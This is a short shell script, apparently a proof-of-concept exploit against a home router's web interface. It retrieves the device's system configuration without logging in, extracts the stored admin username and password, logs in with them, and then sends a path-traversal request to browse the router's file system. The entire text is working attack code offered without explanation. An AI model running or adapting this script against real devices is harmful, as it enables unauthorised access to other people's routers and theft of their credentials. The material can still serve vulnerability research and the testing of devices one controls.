#!/bin/sh

TMP_DIR=$(mktemp -d)

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&file=system'
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&passwd=$http_password" http://192.168.1.1/login.cgi 2>&1 | grep Cooki | awk '{ print $2 }')
http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
wget -qO- --header="Cookie: ${http_session}" "http://192.168.1.1/data.ria?CfgType=storage_status&dir_path=/../../../../"
